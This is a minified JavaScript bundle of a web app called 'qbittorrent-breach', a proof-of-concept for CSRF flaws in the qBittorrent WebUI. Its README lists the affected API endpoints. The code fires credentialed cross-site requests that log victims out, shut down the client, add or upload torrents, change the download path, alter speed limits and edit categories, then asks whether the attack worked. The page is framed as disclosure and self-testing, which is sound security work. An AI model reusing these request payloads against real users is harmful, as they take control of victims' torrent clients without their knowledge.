webpackJsonp([1],{125:function(t,e){},126:function(t,e){},127:function(t,e){},128:function(t,e){},129:function(t,e){},130:function(t,e){},131:function(t,e){},134:function(t,e,r){var n=r(29)(null,r(138),null,null);t.exports=n.exports},135:function(t,e,r){r(130),r(129);var n=r(29)(r(68),r(136),"data-v-3f06a1a4",null);t.exports=n.exports},136:function(t,e){t.exports={render:function(){var t=this,e=t.$createElement,r=t._self._c||e;return r("div",{staticClass:"test"},[r("div",[t._v("\n    Server address: "+t._s(t.server)+"\n  ")]),t._v(" "),r("div",[t._v("Cases("+t._s(t.cases.length)+"):\n    "),r("span",{},[t._v(t._s(t.pendings)+"(pending)")]),t._v(",\n    "),r("span",{staticClass:"case-positive"},[t._v(t._s(t.positives)+"(positive)")]),t._v(",\n    "),r("span",{staticClass:"case-negative"},[t._v(t._s(t.negatives)+"(negative)")]),t._v(".\n  ")]),t._v(" "),r("el-table",{attrs:{data:t.cases,"row-class-name":t.tableRowClassName}},[r("el-table-column",{attrs:{label:"execute",width:"120"},scopedSlots:t._u([["default",function(e){return[r("el-button",{attrs:{type:"positive"===e.row.state?"danger":"",size:"small"},on:{click:function(r){t.execute(e.row)}}},[t._v("\n          execute\n        ")])]}]])}),t._v(" "),r("el-table-column",{attrs:{label:"state",prop:"state",width:"120"}}),t._v(" "),r("el-table-column",{attrs:{prop:"command",label:"command","min-width":"300"}})],1)],1)},staticRenderFns:[]}},137:function(t,e){t.exports={render:function(){var t=this,e=t.$createElement,r=t._self._c||e;return r("div",{attrs:{id:"app"}},[r("readme"),t._v(" "),r("h3",[t._v("CSRF demo")]),t._v(" "),t.test?r("test"):r("button",{on:{click:t.runTest}},[t._v("RUN")])],1)},staticRenderFns:[]}},138:function(t,e){t.exports={render:function(){var t=this,e=t.$createElement,r=t._self._c||e;return r("section",[r("h1",[t._v("qbittorrent-breach")]),t._v(" "),r("blockquote",[r("p",[t._v("qBittorrent security reports")])]),t._v(" "),r("h2",[t._v("CSRF-related")]),t._v(" "),r("h3",[t._v("The WebUI implementation flaws")]),t._v(" "),t._m(0),t._v(" "),r("p",[t._v("This project demonstrates how attackers can control users' qBittorrent processes, manipulating victims' categories, tasks and settings, without being notice.")]),t._v(" "),r("h3",[t._v("APIs affected")]),t._v(" "),r("p",[t._v("All versions ( till the latest v3.3.12) are affected, with the following api being CSRF-flawed.")]),t._v(" "),t._m(1),t._v(" "),r("h3",[t._v("Security tips for users")]),t._v(" "),r("p",[t._v("Util qBittorrent releases a new version fixing the above flaws, I strongly suggest users turn off WebUI and use native UI instead.")])],1)},staticRenderFns:[function(){var t=this,e=t.$createElement,r=t._self._c||e;return r("p",[t._v("The implementation of "),r("a",{attrs:{href:"https://github.com/qbittorrent/qBittorrent/wiki/WebUI-API-Documentation#get-alternative-speed-limits-state"}},[t._v("qBittorrent WebUI")]),t._v(" request handler does'nt do well against "),r("a",{attrs:{href:"https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet"}},[t._v("CSRF attacks")]),t._v(".")])},function(){var t=this,e=t.$createElement,r=t._self._c||e;return r("table",[r("thead",[r("tr",[r("th",[t._v("api")]),t._v(" "),r("th",[t._v("note")])])]),t._v(" "),r("tbody",[r("tr",[r("td",[t._v("/logout")]),t._v(" "),r("td",[t._v("A remote attacker can logout users' current qBittorrent WebUI session.")])]),t._v(" "),r("tr",[r("td",[t._v("/command/shutdown")]),t._v(" "),r("td",[t._v("A remote attacker can make qBittorrent processes exit.")])]),t._v(" "),r("tr",[r("td",[t._v("/command/download")]),t._v(" "),r("td",[t._v("A remote attacker can add download tasks to qBittorrent.")])]),t._v(" "),r("tr",[r("td",[t._v("/command/upload")]),t._v(" "),r("td",[t._v("A remote attacker can add download tasks to qBittorrent.")])]),t._v(" "),r("tr",[r("td",[t._v("/command/addTrackers")]),t._v(" "),r("td",[t._v("A remote attacker can add a trackers to a torrent task. (Need torrent hash)")])]),t._v(" "),r("tr",[r("td",[t._v("/command/pause")]),t._v(" "),r("td",[t._v("A remote attacker can pause a torrent task. (Need torrent hash)")])]),t._v(" "),r("tr",[r("td",[t._v("/command/pauseAll")]),t._v(" "),r("td",[t._v("A remote attacker can pause all torrent tasks.")])]),t._v(" "),r("tr",[r("td",[t._v("/command/resume")]),t._v(" "),r("td",[t._v("A remote attacker can resume a torrent task. (Need torrent hash)")])]),t._v(" "),r("tr",[r("td",[t._v("/command/resumeAll")]),t._v(" "),r("td",[t._v("A remote attacker can resume all torrent tasks.")])]),t._v(" "),r("tr",[r("td",[t._v("/command/delete")]),t._v(" "),r("td",[t._v("A remote attacker can delete a torrent task. (Need torrent hash)")])]),t._v(" "),r("tr",[r("td",[t._v("/command/deletePerm")]),t._v(" "),r("td",[t._v("A remote attacker can delete a torrent task with downloaded data. (Need torrent hash)")])]),t._v(" "),r("tr",[r("td",[t._v("/command/recheck")]),t._v(" "),r("td",[t._v("A remote attacker can make qBittorrent recheck a torrent task. (Need torrent hash)")])]),t._v(" "),r("tr",[r("td",[t._v("/command/increasePrio")]),t._v(" "),r("td",[t._v("A remote attacker can increase torrent priority. (Need torrent hash)")])]),t._v(" "),r("tr",[r("td",[t._v("/command/decreasePrio")]),t._v(" "),r("td",[t._v("A remote attacker can decrease torrent priority. (Need torrent hash)")])]),t._v(" "),r("tr",[r("td",[t._v("/command/topPrio")]),t._v(" "),r("td",[t._v("A remote attacker can maximal torrent priority. (Need torrent hash)")])]),t._v(" "),r("tr",[r("td",[t._v("/command/bottomPrio")]),t._v(" "),r("td",[t._v("A remote attacker can minimal torrent priority. (Need torrent hash)")])]),t._v(" "),r("tr",[r("td",[t._v("/command/setFilePrio")]),t._v(" "),r("td",[t._v("A remote attacker can set torrent priority. (Need torrent hash)")])]),t._v(" "),r("tr",[r("td",[t._v("/command/setGlobalDlLimit")]),t._v(" "),r("td",[t._v("A remote attacker can set global download limit.")])]),t._v(" "),r("tr",[r("td",[t._v("/command/setGlobalUpLimit")]),t._v(" "),r("td",[t._v("A remote attacker can set global upload limit.")])]),t._v(" "),r("tr",[r("td",[t._v("/command/setTorrentsDlLimit")]),t._v(" "),r("td",[t._v("A remote attacker can set torrent download limit. (Need torrent hash)")])]),t._v(" "),r("tr",[r("td",[t._v("/command/setTorrentsUpLimit")]),t._v(" "),r("td",[t._v("A remote attacker can set torrent upload limit. (Need torrent hash)")])]),t._v(" "),r("tr",[r("td",[t._v("/command/setCategory")]),t._v(" "),r("td",[t._v("A remote attacker can set torrent category. (Need torrent hash)")])]),t._v(" "),r("tr",[r("td",[t._v("/command/addCategory")]),t._v(" "),r("td",[t._v("A remote attacker can add new category.")])]),t._v(" "),r("tr",[r("td",[t._v("/command/removeCategories")]),t._v(" "),r("td",[t._v("A remote attacker can remove categories.")])]),t._v(" "),r("tr",[r("td",[t._v("/command/setPreferences")]),t._v(" "),r("td",[t._v("A remote attacker can set qBittorrent preferences.")])]),t._v(" "),r("tr",[r("td",[t._v("/command/toggleAlternativeSpeedLimits")]),t._v(" "),r("td",[t._v("A remote attacker can toggle alternative speed limits.")])]),t._v(" "),r("tr",[r("td",[t._v("/command/toggleSequentialDownload")]),t._v(" "),r("td",[t._v("A remote attacker can toggle sequential download. (Need torrent hash)")])]),t._v(" "),r("tr",[r("td",[t._v("/command/toggleFirstLastPiecePrio")]),t._v(" "),r("td",[t._v("A remote attacker can set first/last piece priority. (Need torrent hash)")])]),t._v(" "),r("tr",[r("td",[t._v("/command/setForceStart")]),t._v(" "),r("td",[t._v("A remote attacker can set force start. (Need torrent hash)")])])])])}]}},139:function(t,e,r){t.exports=r(134)},31:function(t,e,r){"use strict";var n="";e.a={set:function(t){n=t.replace(/\/$/,"")},get:function(){return n},resolve:function(t){var e=("/"+t).replace(/\/{2,}/,"/");return""+n+e}}},55:function(t,e,r){"use strict";var n=r(32),a=r.n(n),o=r(44),s=r.n(o),c=r(119),i=r.n(c),d=r(118),u=r.n(d),l=r(117),v=r.n(l),m=r(125),_=(r.n(m),r(128)),p=(r.n(_),r(127)),f=(r.n(p),r(126));r.n(f);e.a=function(t){t.use(s.a),t.use(i.a),t.use(u.a),a()(t.prototype,{$msgbox:v.a,$alert:v.a.alert,$confirm:v.a.confirm,$prompt:v.a.prompt})}},56:function(t,e,r){r(131);var n=r(29)(r(67),r(137),null,null);t.exports=n.exports},57:function(t,e,r){"use strict";var n=r(69),a=r.n(n),o=r(59),s=r(60),c=r(58),i=r(64),d=r(65),u=r(63),l=function(){return[r.i(o.a)("/logout",s.a,r.i(i.a)(),["Now refresh qBittorrent webui","Check your login state, have you been logged out?"]),r.i(o.a)("/command/shutdown",s.a,r.i(i.a)(),["Now check your qBittorrent process","Is qBittorrent exited?"]),r.i(o.a)("/command/download",function(t){return r.i(u.a)(t,{urls:"http://sample-file.bazadanni.com/download/applications/torrent/sample.torrent",savepath:"/tmp",paused:"true"},!0)},r.i(i.a)(),["Now check your qBittorrent tasks",'Is there a new task named "sample"?']),r.i(o.a)("/command/upload",function(t){return r.i(u.a)(t,{torrents:{type:"blob",data:r.i(c.a)("ZDEwOmNyZWF0ZWQgYnkxOTpxQml0dG9ycmVudCB2My4zLjEwMTM6Y3JlYXRpb24gZGF0ZWkxNDkzOTYyNTQ4ZTQ6aW5mb2Q2Omxlbmd0aGk0N2U0Om5hbWU4OnByb3h5LmpzMTI6cGllY2UgbGVuZ3RoaTE2Mzg0ZTY6cGllY2VzMjA6OLtJNZtIaLqMR/MZaBICPSBCvullODp1cmwtbGlzdDA6ZQ=="),filename:"proxy.js.torrent"},savepath:"/tmp",paused:"true"},!0)},r.i(i.a)(),["Now check your qBittorrent tasks",'Is there a new task named "proxy.js"?']),r.i(o.a)("/command/pauseAll",function(t){return r.i(u.a)(t)},r.i(i.a)("Make sure you have some tasks running"),["Now check your qBittorrent tasks","Are all the torrents paused?"]),r.i(o.a)("/command/resumeAll",function(t){return r.i(u.a)(t)},r.i(i.a)("Make sure you have some tasks paused"),["Now check your qBittorrent tasks","Are all the torrents resumed?"]),r.i(o.a)("/command/setGlobalDlLimit",function(t){return r.i(u.a)(t,{limit:1024})},r.i(i.a)(),["Now check the global download limit for your qBittorrent","Is the global download limit now 1KiB/s?"]),r.i(o.a)("/command/setGlobalUpLimit",function(t){return r.i(u.a)(t,{limit:1024})},r.i(i.a)(),["Now check the global upload limit for your qBittorrent","Is the global upload limit now 1KiB/s?"]),r.i(o.a)("/command/addCategory",function(t){return r.i(u.a)(t,{category:"csrf-category"})},r.i(i.a)(),["Now check the categories of your qBittorrent",'Is there a new category named "csrf-category"?']),r.i(o.a)("/command/removeCategories",function(t){return r.i(u.a)(t,{categories:"csrf-category"})},r.i(i.a)(),["Now check the categories of your qBittorrent",'Is there the category "csrf-category" removed?']),r.i(o.a)("/command/setPreferences",function(t){return r.i(u.a)(t,{json:a()({save_path:d.a.gen()})})},r.i(i.a)(),function(){return["Now check the default download path of your qBittorrent",'Is the default download path now "'+d.a.get()+'"?']}),r.i(o.a)("/command/toggleAlternativeSpeedLimits",function(t){return r.i(u.a)(t)},r.i(i.a)(),["Now check your qBittorrent UI","Is the alternate speed state toggled?"])]};e.a=l},58:function(t,e,r){"use strict";var n=function(t){for(var e=atob(t),r=e.length,n=new ArrayBuffer(r),a=new Uint8Array(n),o=0;o<r;o+=1)a[o]=e.charCodeAt(o);return new Blob([a])};e.a=n},59:function(t,e,r){"use strict";var n=r(31),a=function(t,e,r,a){return{type:"CSRF",state:"pending",command:t,test:function(){return e(n.a.resolve(t))},prepare:r,confirm:a}};e.a=a},60:function(t,e,r){"use strict";var n=r(17),a=r.n(n),o=function(t){return new a.a(function(e){var r=new Image;r.src=t,r.onload=e,r.onerror=e})};e.a=o},61:function(t,e,r){"use strict";var n=function(t){for(var e="function"==typeof t?t():t,r=arguments.length,n=Array(r>1?r-1:0),a=1;a<r;a++)n[a-1]=arguments[a];var o=Array.isArray(e)?e.concat(n):[e].concat(n);if(o.length>1){var s=this.$createElement;return s("ol",null,o.map(function(t){return s("li",null,t)}))}return o[0]};e.a=n},62:function(t,e,r){"use strict";var n=r(32),a=r.n(n),o=function(t){return a()({closeOnClickModal:!1,closeOnPressEscape:!1,showCancelButton:!1,lockScroll:!0,showClose:!1,confirmButtonText:"confirm",cancelButtonText:"cancel"},t)};e.a=o},63:function(t,e,r){"use strict";var n=r(70),a=r.n(n),o=r(17),s=r.n(o),c=function(t){var e=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},r=arguments[2];return new s.a(function(n){var o=new XMLHttpRequest,s=a()(e),c=void 0;try{o.responseType="text",o.withCredentials=!0}catch(t){console.error(t)}o.open("POST",t,!0),r?(c=new FormData,s.forEach(function(t){var r=e[t];r&&"blob"===r.type?c.append(t,r.data,r.filename):c.append(t,r)})):(o.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),c=s.map(function(t){var r=""+e[t];return encodeURIComponent(t)+"="+encodeURIComponent(r)}).join("&")),o.onreadystatechange=function(){4===o.readyState&&n(o.responseText)},o.send(c)})};e.a=c},64:function(t,e,r){"use strict";var n=function(){for(var t=arguments.length,e=Array(t),r=0;r<t;r++)e[r]=arguments[r];return["Open qBittorrent webui in another browser tab","Login with your username and password"].concat(e)};e.a=n},65:function(t,e,r){"use strict";var n="/tmp1",a=function(){var t=Math.floor(Math.random()*Math.pow(2,53));return n="/tmp"+t},o=function(){return n};e.a={gen:a,get:o}},66:function(t,e,r){"use strict";Object.defineProperty(e,"__esModule",{value:!0});var n=r(0),a=r(55),o=r(56),s=r.n(o);r.i(a.a)(n.default),n.default.config.productionTip=!1,new n.default({el:"#app",render:function(t){return t(s.a)}})},67:function(t,e,r){"use strict";Object.defineProperty(e,"__esModule",{value:!0});var n=r(139),a=r.n(n),o=r(135),s=r.n(o);e.default={components:{Readme:a.a,Test:s.a},data:function(){return{test:!1}},methods:{runTest:function(){this.test=!0}}}},68:function(t,e,r){"use strict";Object.defineProperty(e,"__esModule",{value:!0});var n=r(72),a=r.n(n),o=r(71),s=r.n(o),c=r(31),i=r(61),d=r(62),u=r(57);e.default={name:"app",data:function(){return{cases:r.i(u.a)(),server:"http://localhost:8080"}},computed:{pendings:function(){return this.cases.filter(function(t){return"pending"===t.state}).length},positives:function(){return this.cases.filter(function(t){return"positive"===t.state}).length},negatives:function(){return this.cases.filter(function(t){return"negative"===t.state}).length}},mounted:function(){var t=this;return s()(a.a.mark(function e(){var r;return a.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:return e.next=2,t.askServerAddress();case 2:r=e.sent,t.server=r,c.a.set(r);case 5:case"end":return e.stop()}},e,t)}))()},methods:{msgboxMsg:i.a,tableRowClassName:function(t){return"case-"+t.state},askServerAddress:function(){var t=this;return s()(a.a.mark(function e(){var n,o,s;return a.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:return e.prev=0,n=function(t){return/^https?:\/\/\S+$/.test(t)},e.next=4,t.$prompt(t.msgboxMsg("Your server address please?"),r.i(d.a)({showInput:!0,title:"server address",inputValidator:function(t){return!t||n(t)},inputPlaceholder:"http://localhost:8080",inputErrorMessage:"Invalid url"}));case 4:return o=e.sent,s=o.value,e.abrupt("return",s||"http://localhost:8080");case 9:return e.prev=9,e.t0=e.catch(0),console.error(e.t0),e.abrupt("return",t.askServerAddress());case 13:case"end":return e.stop()}},e,t,[[0,9]])}))()},execute:function(t){var e=this;return s()(a.a.mark(function n(){var o;return a.a.wrap(function(n){for(;;)switch(n.prev=n.next){case 0:return n.prev=0,n.next=3,e.$confirm(e.msgboxMsg(t.prepare),r.i(d.a)({title:t.desc,confirmButtonText:"I'm prepared",showClose:!0}));case 3:return e.$set(t,"state","executing"),n.next=6,t.test();case 6:return o=!1,n.prev=7,n.next=10,e.$confirm(e.msgboxMsg(t.confirm,'If yes, click "It\'s breached!", if not, click "It\'s fine."'),r.i(d.a)({title:t.desc,confirmButtonText:"It's breached!",showCancelButton:!0,cancelButtonText:"It's fine."}));case 10:o=!0,n.next=20;break;case 13:if(n.prev=13,n.t0=n.catch(7),"cancel"!==n.t0){n.next=19;break}o=!1,n.next=20;break;case 19:throw n.t0;case 20:e.$set(t,"state",o?"positive":"negative"),n.next=27;break;case 23:n.prev=23,n.t1=n.catch(0),e.$set(t,"state","init"),console.error(n.t1);case 27:case"end":return n.stop()}},n,e,[[0,23],[7,13]])}))()}}}}},[66]);
//# sourceMappingURL=app.7748371affde5d58e0b0.js.map